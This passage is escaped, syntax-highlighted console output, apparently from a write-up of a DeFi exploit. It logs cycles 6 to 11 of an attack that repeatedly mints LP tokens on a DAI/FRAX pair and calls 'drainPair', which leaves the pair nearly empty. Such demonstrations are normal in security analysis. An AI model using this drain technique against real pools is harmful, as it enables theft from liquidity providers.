class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6250005000001500000200000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6250005000001500000200000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e31250031250012500002500000250000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e31250031250012500002500000250000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e7\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e156250187500093750025000003750000300000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e156250187500093750025000003750000300000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e781251093750656250218750043750005250000350000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e781251093750656250218750043750005250000350000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3906256250004375001750000437500070000007000000400000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3906256250004375001750000437500070000007000000400000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e19531285156278125013125003937500787500105000009000000450000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e19531285156278125013125003937500787500105000009000000450000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e. \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Balance: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e97656445312675781343750032812507875001312500150000011250000500000009999000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e97656445312675781343750032812507875001312500150000011250000500000010000000\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eCalled\u003c/span\u003e\u003cspan 